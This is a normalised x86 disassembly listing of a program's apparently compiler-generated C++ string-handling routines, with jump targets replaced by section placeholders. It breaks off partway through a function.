push edx
mov eax [ ebp + 0x8 ]
push eax
call sub_412c10
add esp 0xc
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
sub_40ab40
push ebp
mov ebp esp
push ecx
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov ecx [ ebp + 0x10 ]
push ecx
mov edx [ ebp + 0xc ]
push edx
mov eax [ ebp + 0x8 ]
push eax
call sub_40f760
add esp 0xc
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
sub_40abe0
push ebp
mov ebp esp
sub esp 0x8
mov [ ebp - 0x8 ] ecx
mov eax [ ebp - 0x8 ]
cmp eax [ ebp + 0x8 ]
jne r-xdata
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x4 ] 0x1
jmp r-xdata
mov al [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn 0x4
sub_40ac10
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp - 0x4 ]
call sub_40abc0
mov eax [ ebp + 0x8 ]
and eax 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn 0x4
mov ecx [ ebp - 0x4 ]
push ecx
call j_sub_40f691
add esp 0x4
sub_40ac70
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov [ eax ] ecx
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0xc ]
mov [ edx + 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn 0x8
sub_40aca0
push ebp
mov ebp esp
sub esp 0x8
push esi
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp + 0x8 ]
call sub_40ac50
push eax
mov ecx [ ebp - 0x4 ]
call sub_40ac50
mov ecx eax
call sub_40abe0
movzx eax al
test eax eax
je r-xdata
mov [ ebp - 0x8 ] 0x0
mov ecx [ ebp - 0x4 ]
call sub_40ac40
mov esi eax
mov ecx [ ebp + 0x8 ]
call sub_40ac40
cmp esi eax
jne r-xdata
mov [ ebp - 0x8 ] 0x1
jmp r-xdata
mov al [ ebp - 0x8 ]
pop esi
mov esp ebp
pop ebp
retn 0x4
sub_40ad00
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
push eax
mov ecx [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
call sub_40ac70
mov eax [ ebp + 0x8 ]
mov esp ebp
pop ebp
retn 0x8
sub_40ad20
push ebp
mov ebp esp
sub esp 0xc
mov [ ebp - 0x4 ] ecx
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
lea edx [ ebp - 0xc ]
push edx
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
mov ecx [ ebp - 0x4 ]
mov eax [ edx + 0xc ]
call eax
mov ecx eax
call sub_40aca0
mov esp ebp
pop ebp
retn 0x8
sub_40ad50
push ebp
mov ebp esp
sub esp 0x8
mov [ ebp - 0x8 ] ecx
mov ecx [ ebp + 0x8 ]
call sub_40ac50
push eax
mov ecx [ ebp - 0x8 ]
call sub_40abe0
movzx eax al
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0x0
mov ecx [ ebp + 0x8 ]
call sub_40ac40
cmp eax [ ebp + 0xc ]
jne r-xdata
mov [ ebp - 0x4 ] 0x1
jmp r-xdata
mov al [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn 0x8
sub_40add0
push ebp
mov ebp esp
sub esp 0x10
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0xc ] 0x0
mov eax [ ebp + 0xc ]
push eax
call sub_41aa11
add esp 0x4
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov [ ebp - 0x8 ] r--data
mov ecx [ ebp - 0x4 ]
mov [ ebp - 0x8 ] ecx
jmp r-xdata
mov edx [ ebp - 0x8 ]
push edx
mov ecx [ ebp + 0x8 ]
call sub_40b060
mov eax [ ebp - 0xc ]
or eax 0x1
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov esp ebp
pop ebp
retn 0x8
sub_40ae30
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp - 0x4 ]
call sub_40ae60
mov eax [ ebp + 0x8 ]
and eax 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn 0x4
mov ecx [ ebp - 0x4 ]
push ecx
call j_sub_40f691
add esp 0x4
sub_40aeb0
push ebp
mov ebp esp
sub esp 0x8
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] 0x0
cmp [ ebp + 0xc ] 0x1
jne r-xdata
mov ecx [ ebp + 0xc ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
mov ecx [ ebp - 0x8 ]
call sub_40add0
mov eax [ ebp - 0x4 ]
or eax 0x1
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push r--data
mov ecx [ ebp + 0x8 ]
call sub_40b060
mov eax [ ebp - 0x4 ]
or eax 0x1
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
jmp r-xdata
mov esp ebp
pop ebp
retn 0x8
sub_40af10
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp - 0x4 ]
call sub_40af40
mov eax [ ebp + 0x8 ]
and eax 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn 0x4
mov ecx [ ebp - 0x4 ]
push ecx
call j_sub_40f691
add esp 0x4
sub_40af90
push ebp
mov ebp esp
sub esp 0x10
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0xc ] 0x0
mov eax [ ebp + 0xc ]
push eax
call sub_41aa3b
add esp 0x4
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov [ ebp - 0x8 ] r--data
mov ecx [ ebp - 0x4 ]
mov [ ebp - 0x8 ] ecx
jmp r-xdata
mov edx [ ebp - 0x8 ]
push edx
mov ecx [ ebp + 0x8 ]
call sub_40b060
mov eax [ ebp - 0xc ]
or eax 0x1
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov esp ebp
pop ebp
retn 0x8
sub_40aff0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp + 0xc ]
push eax
call sub_41aa11
add esp 0x4
test eax eax
je r-xdata
call sub_40b050
push eax
mov edx [ ebp + 0xc ]
push edx
mov ecx [ ebp + 0x8 ]
call sub_40ac70
mov eax [ ebp + 0x8 ]
call sub_40b040
push eax
mov ecx [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
call sub_40ac70
mov eax [ ebp + 0x8 ]
jmp r-xdata
mov esp ebp
pop ebp
retn 0x8
sub_40b060
push ebp
mov ebp esp
sub esp 0x8
mov [ ebp - 0x8 ] ecx
lea ecx [ ebp - 0x1 ]
call sub_40b340
push eax
mov ecx [ ebp - 0x8 ]
call sub_40b350
push 0x0
push 0x0
mov ecx [ ebp - 0x8 ]
call sub_40b2a0
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x8 ]
call sub_40b250
mov eax [ ebp - 0x8 ]
mov esp ebp
pop ebp
retn 0x4
sub_40b0c0
push ebp
mov ebp esp
sub esp 0x8
mov [ ebp - 0x8 ] ecx
lea ecx [ ebp - 0x1 ]
call sub_40b340
push eax
mov ecx [ ebp - 0x8 ]
call sub_40b350
push 0x0
push 0x0
mov ecx [ ebp - 0x8 ]
call sub_40b520
mov eax [ ebp - 0x8 ]
mov esp ebp
pop ebp
retn
sub_40b0f0
push ebp
mov ebp esp
sub esp 0x8
mov [ ebp - 0x8 ] ecx
lea ecx [ ebp - 0x1 ]
call sub_40b340
push eax
mov ecx [ ebp - 0x8 ]
call sub_40b350
push 0x0
push 0x0
mov ecx [ ebp - 0x8 ]
call sub_40b520
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x8 ]
call sub_40b3d0
mov eax [ ebp - 0x8 ]
mov esp ebp
pop ebp
retn 0x4
sub_40b170
push ebp
mov ebp esp
sub esp 0xc
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x10 ]
cmp ecx [ ebp + 0x8 ]
jae r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x10 ]
sub eax [ ebp + 0x8 ]
cmp eax [ ebp + 0xc ]
ja r-xdata
mov ecx [ ebp - 0x4 ]
call sub_40b5c0
cmp [ ebp + 0xc ] 0x0
jbe r-xdata
mov ecx [ ebp + 0x8 ]
push ecx
mov ecx [ ebp - 0x4 ]
call sub_40b4e0
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn 0x8
mov ecx [ ebp - 0x4 ]
call sub_40b5e0
mov edx [ ebp + 0x8 ]
lea eax [ eax + edx * 2 ]
mov [ ebp - 0x8 ] eax
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x10 ]
sub edx [ ebp + 0xc ]
mov [ ebp - 0xc ] edx
mov eax [ ebp - 0xc ]
sub eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp + 0xc ]
mov edx [ ebp - 0x8 ]
lea eax [ edx + ecx * 2 ]
push eax
mov ecx [ ebp - 0x8 ]
push ecx
call sub_40aa70
add esp 0xc
mov edx [ ebp - 0xc ]
push edx
mov ecx [ ebp - 0x4 ]
call sub_40b4e0
sub_40b220
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp + 0x8 ]
push eax
call sub_40a9a0
add esp 0x4
push eax
mov ecx [ ebp + 0xc ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
mov ecx [ ebp - 0x4 ]
call sub_40b400
mov esp ebp
pop ebp
retn 0x8
sub_40b250
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp + 0x8 ]
push eax
call sub_40aac0
add esp 0x4
push eax
mov ecx [ ebp + 0x8 ]
push ecx
mov ecx [ ebp - 0x4 ]
call sub_40b620
mov esp ebp
pop ebp
retn 0x4
sub_40b2a0
push ebp
mov ebp esp
sub esp 0xc
mov [ ebp - 0x8 ] ecx
movzx eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
mov ecx [ ebp - 0x8 ]
cmp [ ecx + 0x14 ] 0x10
jb r-xdata
jmp r-xdata
mov ecx [ ebp - 0x8 ]
mov [ ecx + 0x14 ] 0xf
mov edx [ ebp + 0xc ]
push edx
mov ecx [ ebp - 0x8 ]
call sub_40b6a0
mov esp ebp
pop ebp
retn 0x8
mov edx [ ebp - 0x8 ]
mov eax [ edx ]
mov [ ebp - 0xc ] eax
mov ecx [ ebp - 0x8 ]
push ecx
lea edx [ ebp - 0x1 ]
push edx
mov ecx [ ebp - 0x8 ]
call sub_40b370
mov ecx eax
call sub_40c190
cmp [ ebp + 0xc ] 0x0
jbe r-xdata
mov eax [ ebp - 0x8 ]
mov ecx [ eax + 0x14 ]
add ecx 0x1
push ecx
mov edx [ ebp - 0xc ]
push edx
lea eax [ ebp - 0x2 ]
push eax
mov ecx [ ebp - 0x8 ]
call sub_40b370
mov ecx eax
call sub_40b700
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp - 0xc ]
push ecx
call sub_40c1b0
add esp 0x4
push eax
mov edx [ ebp - 0x8 ]
push edx
call sub_40ab10
add esp 0xc
sub_40b390
push ebp
mov ebp esp
sub esp 0x8
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x14 ] 0x10
jb r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x8 ] eax
mov ecx [ ebp - 0x4 ]
mov edx [ ecx ]
push edx
call sub_40c1b0
add esp 0x4
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov esp ebp
pop ebp
retn
sub_40b3d0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp + 0x8 ]
push eax
call sub_40a9a0
add esp 0x4
push eax
mov ecx [ ebp + 0x8 ]
push ecx
mov ecx [ ebp - 0x4 ]
call sub_40b750
mov esp ebp
pop ebp
retn 0x4
sub_40b400
push ebp
mov ebp esp
sub esp 0x10
mov [ ebp - 0x8 ] ecx
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp + 0xc ]
cmp eax [ edx + 0x10 ]
jae r-xdata
mov eax [ ebp - 0x8 ]
mov ecx [ ebp + 0xc ]
cmp ecx [ eax + 0x10 ]
ja r-xdata
mov eax [ r--data ]
mov ecx [ ebp - 0x8 ]
mov edx [ ecx + 0x10 ]
sub edx [ ebp + 0xc ]
mov [ ebp - 0x4 ] edx
mov eax [ ebp + 0x10 ]
cmp eax [ ebp - 0x4 ]
ja r-xdata
mov eax [ ebp + 0xc ]
jmp r-xdata
mov ecx [ ebp + 0x10 ]
sub ecx 0x1
mov edx [ ebp - 0x4 ]
sub edx ecx
mov [ ebp - 0x4 ] edx
mov ecx [ ebp - 0x8 ]
call sub_40b5e0
mov ecx [ ebp + 0xc ]
lea edx [ eax + ecx * 2 ]
mov [ ebp - 0x10 ] edx
jmp r-xdata
mov esp ebp
pop ebp
retn 0xc
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
push ecx
mov edx [ ebp - 0x10 ]
push edx
call sub_40aa30
add esp 0xc
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax [ ebp + 0x10 ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
mov edx [ ebp - 0xc ]
push edx
call sub_40a960
add esp 0xc
test eax eax
jne r-xdata
jmp r-xdata
mov ecx [ ebp - 0x8 ]
call sub_40b5e0
mov ecx [ ebp - 0xc ]
sub ecx eax
sar ecx 0x1
mov eax ecx
jmp r-xdata
mov eax [ ebp - 0xc ]
sub eax [ ebp - 0x10 ]
sar eax 0x1
add eax 0x1
mov ecx [ ebp - 0x4 ]
sub ecx eax
mov [ ebp - 0x4 ] ecx
mov edx [ ebp - 0xc ]
add edx 0x2
mov [ ebp - 0x10 ] edx
sub_40b4e0
push ebp
mov ebp esp
sub esp 0x8
mov [ ebp - 0x8 ] ecx
xor eax eax
mov [ ebp - 0x2 ] ax
mov ecx [ ebp - 0x8 ]
mov edx [ ebp + 0x8 ]
mov [ ecx + 0x10 ] edx
lea eax [ ebp - 0x2 ]
push eax
mov ecx [ ebp - 0x8 ]
call sub_40b5e0
mov ecx [ ebp + 0x8 ]
lea edx [ eax + ecx * 2 ]
push edx
call sub_40aaa0
add esp 0x8
mov esp ebp
pop ebp
retn 0x4
sub_40b520
push ebp
mov ebp esp
sub esp 0xc
mov [ ebp - 0x8 ] ecx
movzx eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
mov ecx [ ebp - 0x8 ]
cmp [ ecx + 0x14 ] 0x8
jb r-xdata
jmp r-xdata
mov ecx [ ebp - 0x8 ]
mov [ ecx + 0x14 ] 0x7
mov edx [ ebp + 0xc ]
push edx
mov ecx [ ebp - 0x8 ]
call sub_40b4e0
mov esp ebp
pop ebp
retn 0x8
mov edx [ ebp - 0x8 ]
mov eax [ edx ]
mov [ ebp - 0xc ] eax
mov ecx [ ebp - 0x8 ]
push ecx
lea edx [ ebp - 0x1 ]
push edx
mov ecx [ ebp - 0x8 ]
call sub_40b370
mov ecx eax
call sub_40c190
cmp [ ebp + 0xc ] 0x0
jbe r-xdata
mov eax [ ebp - 0x8 ]
mov ecx [ eax + 0x14 ]
add ecx 0x1
push ecx
mov edx [ ebp - 0xc ]
push edx
lea eax [ ebp - 0x2 ]
push eax
mov ecx [ ebp - 0x8 ]
call sub_40b370
mov ecx eax
call sub_40b700
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp - 0xc ]
push ecx
call sub_40c1b0
add esp 0x4
push eax
mov edx [ ebp - 0x8 ]
push edx
call sub_40aa00
add esp 0xc
sub_40b5e0
push ebp
mov ebp esp
sub esp 0x8
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x14 ] 0x8
jb r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x8 ] eax
mov ecx [ ebp - 0x4 ]
mov edx [ ecx ]
push edx
call sub_40c1b0
add esp 0x4
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov esp ebp
pop ebp
retn
sub_40b620
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
call sub_40b930
movzx ecx al
test ecx ecx
je r-xdata
push 0x0
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp - 0x4 ]
call sub_40b880
movzx ecx al
test ecx ecx
je r-xdata
mov edx [ ebp + 0xc ]
push edx
mov ecx [ ebp - 0x4 ]
call sub_40b390
mov ecx [ ebp + 0x8 ]
sub ecx eax
push ecx
mov edx [ ebp - 0x4 ]
push edx
mov ecx [ ebp - 0x4 ]
call sub_40b7d0
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0xc ]
push edx
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
call sub_40b390
push eax
call sub_40ab10
add esp 0xc
mov ecx [ ebp + 0xc ]
push ecx
mov ecx [ ebp - 0x4 ]
call sub_40b6a0
mov esp ebp
pop ebp
retn 0x8
sub_40b6a0
push ebp
mov ebp esp
sub esp 0x8
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x1 ] 0x0
mov eax [ ebp - 0x8 ]
mov ecx [ ebp + 0x8 ]
mov [ eax + 0x10 ] ecx
lea edx [ ebp - 0x1 ]
push edx
mov ecx [ ebp - 0x8 ]
call sub_40b390
add eax [ ebp + 0x8 ]
push eax
call sub_40ab70
add esp 0x8
mov esp ebp
pop ebp
retn 0x4
sub_40b700
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
mov ecx [ ebp - 0x4 ]
call sub_40b990
mov esp ebp
pop ebp
retn 0x8
sub_40b750
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
call sub_40bb10
movzx ecx al
test ecx ecx
je r-xdata
push 0x0
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp - 0x4 ]
call sub_40ba60
movzx ecx al
test ecx ecx
je r-xdata
mov edx [ ebp + 0xc ]
push edx
mov ecx [ ebp - 0x4 ]
call sub_40b5e0
mov ecx [ ebp + 0x8 ]
sub ecx eax
sar ecx 0x1
push ecx
mov edx [ ebp - 0x4 ]
push edx
mov ecx [ ebp - 0x4 ]
call sub_40b9b0
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0xc ]
push edx
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
call sub_40b5e0
push eax
call sub_40aa00
add esp 0xc
mov ecx [ ebp + 0xc ]
push ecx
mov ecx [ ebp - 0x4 ]
call sub_40b4e0
mov esp ebp
pop ebp
retn 0x8
sub_40b7d0
push ebp
mov ebp esp
sub esp 0x8
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp + 0x8 ]
call sub_40b280
cmp eax [ ebp + 0xc ]
jae r-xdata
mov ecx [ ebp + 0x8 ]
call sub_40b280
sub eax [ ebp + 0xc ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x10 ]
cmp eax [ ebp - 0x8 ]
jae r-xdata
mov ecx [ ebp - 0x4 ]
call sub_40b5c0
mov edx [ ebp - 0x4 ]
cmp edx [ ebp + 0x8 ]
jne r-xdata
mov ecx [ ebp + 0x10 ]
mov [ ebp - 0x8 ] ecx
push 0x0
mov edx [ ebp - 0x8 ]
push edx
mov ecx [ ebp - 0x4 ]
call sub_40b880
movzx eax al
test eax eax
je r-xdata
mov eax [ ebp + 0xc ]
add eax [ ebp - 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
call sub_40bb50
mov ecx [ ebp + 0xc ]
push ecx
push 0x0
mov ecx [ ebp - 0x4 ]
call sub_40bb80
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn 0xc
mov ecx [ ebp - 0x8 ]
push ecx
mov ecx [ ebp + 0x8 ]
call sub_40b390
add eax [ ebp + 0xc ]
push eax
mov ecx [ ebp - 0x4 ]
call sub_40b390
push eax
call sub_40ab10
add esp 0xc
mov edx [ ebp - 0x8 ]
push edx
mov ecx [ ebp - 0x4 ]
call sub_40b6a0
sub_40b880
push ebp
mov ebp esp
sub esp 0xc
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp - 0x4 ]
call sub_40bc10
cmp eax [ ebp + 0x8 ]
jae r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x14 ]
cmp ecx [ ebp + 0x8 ]
jae r-xdata
mov ecx [ ebp - 0x4 ]
call sub_40b970
movzx edx [ ebp + 0xc ]
test edx edx
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x10 ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
mov ecx [ ebp - 0x4 ]
call sub_40bc50
jmp r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
cmp [ ebp + 0x8 ] 0x10
jae r-xdata
cmp [ ebp + 0x8 ] 0x0
jbe r-xdata
push 0x0
mov ecx [ ebp - 0x4 ]
call sub_40b6a0
mov eax [ ebp - 0x4 ]
mov ecx [ ebp + 0x8 ]
cmp ecx [ eax + 0x10 ]
jae r-xdata
mov [ ebp - 0xc ] 0x0
mov [ ebp - 0xc ] 0x1
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x10 ]
mov [ ebp - 0x8 ] ecx
mov edx [ ebp + 0x8 ]
mov [ ebp - 0x8 ] edx
jmp r-xdata
mov al [ ebp - 0xc ]
mov esp ebp
pop ebp
retn 0x8
mov edx [ ebp - 0x8 ]
push edx
push 0x1
mov ecx [ ebp - 0x4 ]
call sub_40b2a0
jmp r-xdata
sub_40b930
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
cmp [ ebp + 0x8 ] 0x0
je r-xdata
xor al al
jmp r-xdata
mov ecx [ ebp - 0x4 ]
call sub_40b390
cmp [ ebp + 0x8 ] eax
jb r-xdata
mov esp ebp
pop ebp
retn 0x4
mov ecx [ ebp - 0x4 ]
call sub_40b390
mov ecx [ ebp - 0x4 ]
add eax [ ecx + 0x10 ]
cmp eax [ ebp + 0x8 ]
ja r-xdata
mov al 0x1
sub_40b9b0
push ebp
mov ebp esp
sub esp 0x8
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp + 0x8 ]
call sub_40b280
cmp eax [ ebp + 0xc ]
jae r-xdata
mov ecx [ ebp + 0x8 ]
call sub_40b280
sub eax [ ebp + 0xc ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x10 ]
cmp eax [ ebp - 0x8 ]
jae r-xdata
mov ecx [ ebp - 0x4 ]
call sub_40b5c0
mov edx [ ebp - 0x4 ]
cmp edx [ ebp + 0x8 ]
jne r-xdata
mov ecx [ ebp + 0x10 ]
mov [ ebp - 0x8 ] ecx
push 0x0
mov edx [ ebp - 0x8 ]
push edx
mov ecx [ ebp - 0x4 ]
call sub_40ba60
movzx eax al
test eax eax
je r-xdata
mov eax [ ebp + 0xc ]
add eax [ ebp - 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
call sub_40be20
mov ecx [ ebp + 0xc ]
push ecx
push 0x0
mov ecx [ ebp - 0x4 ]
call sub_40b170
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn 0xc
mov ecx [ ebp - 0x8 ]
push ecx
mov ecx [ ebp + 0x8 ]
call sub_40b5e0
mov edx [ ebp + 0xc ]
lea eax [ eax + edx * 2 ]
push eax
mov ecx [ ebp - 0x4 ]
call sub_40b5e0
push eax
call sub_40aa00
add esp 0xc
mov ecx [ ebp - 0x8 ]
push ecx
mov ecx [ ebp - 0x4 ]
call sub_40b4e0
sub_40ba60
push ebp
mov ebp esp
sub esp 0xc
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp - 0x4 ]
call sub_40be50
cmp eax [ ebp + 0x8 ]
jae r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x14 ]
cmp ecx [ ebp + 0x8 ]
jae r-xdata
mov ecx [ ebp - 0x4 ]
call sub_40b970
movzx edx [ ebp + 0xc ]
test edx edx
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x10 ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
mov ecx [ ebp - 0x4 ]
call sub_40be90
jmp r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
cmp [ ebp + 0x8 ] 0x8
jae r-xdata
cmp [ ebp + 0x8 ] 0x0
jbe r-xdata
push 0x0
mov ecx [ ebp - 0x4 ]
call sub_40b4e0
mov eax [ ebp - 0x4 ]
mov ecx [ ebp + 0x8 ]
cmp ecx [ eax + 0x10 ]
jae r-xdata
mov [ ebp - 0xc ] 0x0
mov [ ebp - 0xc ] 0x1
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x10 ]
mov [ ebp - 0x8 ] ecx
mov edx [ ebp + 0x8 ]
mov [ ebp - 0x8 ] edx
jmp r-xdata
mov al [ ebp - 0xc ]
mov esp ebp
pop ebp
retn 0x8
mov edx [ ebp - 0x8 ]
push edx
push 0x1
mov ecx [ ebp - 0x4 ]
call sub_40b520
jmp r-xdata
sub_40bb10
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
cmp [ ebp + 0x8 ] 0x0
je r-xdata
xor al al
jmp r-xdata
mov ecx [ ebp - 0x4 ]
call sub_40b5e0
cmp [ ebp + 0x8 ] eax
jb r-xdata
mov esp ebp
pop ebp
retn 0x4
mov ecx [ ebp - 0x4 ]
call sub_40b5e0
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x10 ]
lea eax [ eax + edx * 2 ]
cmp eax [ ebp + 0x8 ]
ja r-xdata
mov al 0x1
sub_40bb50
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x10 ]
cmp ecx [ ebp + 0x8 ]
jae r-xdata
mov edx [ ebp + 0x8 ]
push edx
mov ecx [ ebp - 0x4 ]
call sub_40b6a0
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn 0x4
mov ecx [ ebp - 0x4 ]
call sub_40b5c0
sub_40bb80
push ebp
mov ebp esp
sub esp 0xc
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x10 ]
cmp ecx [ ebp + 0x8 ]
jae r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x10 ]
sub eax [ ebp + 0x8 ]
cmp eax [ ebp + 0xc ]
ja r-xdata
mov ecx [ ebp - 0x4 ]
call sub_40b5c0
cmp [ ebp + 0xc ] 0x0
jbe r-xdata
mov ecx [ ebp + 0x8 ]
push ecx
mov ecx [ ebp - 0x4 ]
call sub_40b6a0
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn 0x8
mov ecx [ ebp - 0x4 ]
call sub_40b390
add eax [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x10 ]
sub eax [ ebp + 0xc ]
mov [ ebp - 0xc ] eax
mov ecx [ ebp - 0xc ]
sub ecx [ ebp + 0x8 ]
push ecx
mov edx [ ebp - 0x8 ]
add edx [ ebp + 0xc ]
push edx
mov eax [ ebp - 0x8 ]
push eax
call sub_40ab40
add esp 0xc
mov ecx [ ebp - 0xc ]
push ecx
mov ecx [ ebp - 0x4 ]
call sub_40b6a0
sub_40bc10
push ebp
mov ebp esp
sub esp 0x10
mov [ ebp - 0x10 ] ecx
lea eax [ ebp - 0x1 ]
push eax
mov ecx [ ebp - 0x10 ]
call sub_40b370
mov ecx eax
call sub_40c080
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x1
ja r-xdata
mov ecx [ ebp - 0x8 ]
sub ecx 0x1
mov [ ebp - 0xc ] ecx
mov [ ebp - 0xc ] 0x1
jmp r-xdata
mov eax [ ebp - 0xc ]
mov esp ebp
pop ebp
retn
sub_40bc50
push ebp
mov ebp esp
push 0xffffffff
push sub_41be00
mov eax [ fs : 0x0 ]
push eax
push ecx
sub esp 0x24
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x14 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov [ ebp - 0x1c ] ecx
mov eax [ ebp + 0x8 ]
or eax 0xf
mov [ ebp - 0x20 ] eax
mov ecx [ ebp - 0x1c ]
call sub_40bc10
cmp eax [ ebp - 0x20 ]
jae r-xdata
mov eax [ ebp - 0x20 ]
xor edx edx
mov ecx 0x3
div ecx
